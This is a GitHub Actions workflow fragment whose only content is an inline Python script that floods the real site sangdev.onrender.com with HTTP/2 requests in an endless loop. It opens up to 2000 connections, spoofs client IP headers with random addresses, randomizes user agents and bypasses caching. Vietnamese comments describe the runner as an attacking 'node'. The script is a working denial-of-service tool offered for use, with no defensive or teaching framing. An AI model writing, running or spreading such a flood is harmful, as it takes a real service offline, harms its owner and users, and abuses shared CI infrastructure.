    steps:
      - name: Install Dependencies
        run: pip install "httpx[http2]" nest_asyncio

      - name: Execute
        run: |
          python3 -c "
          import asyncio, httpx, random, nest_asyncio
          nest_asyncio.apply()
          
          URL = 'https://sangdev.onrender.com/'
          FILES = ['assets/css/style.css', 'assets/js/main.js', 'login', 'search?q=exploit']
          
          async def start():
              limits = httpx.Limits(max_connections=2000, max_keepalive_connections=1000)
              async with httpx.AsyncClient(limits=limits, verify=False, http2=True) as client:
                  while True:
                      fake_ip = f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}'
                      headers = {
                          'X-Forwarded-For': fake_ip,
                          'X-Real-IP': fake_ip,
                          'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) {random.random()}',
                          'Cache-Control': 'no-cache'
                      }
                      target = URL + random.choice(FILES)
                      try:
                          # Gửi request và không đợi tải hết nội dung để tối ưu tốc độ
                          await client.get(target, headers=headers, timeout=0.8)
                      except Exception:
                          pass
          
          print('🔥 Node đang hoạt động với HTTP/2...')
          try:
              asyncio.run(start())
          except KeyboardInterrupt:
              pass
          "
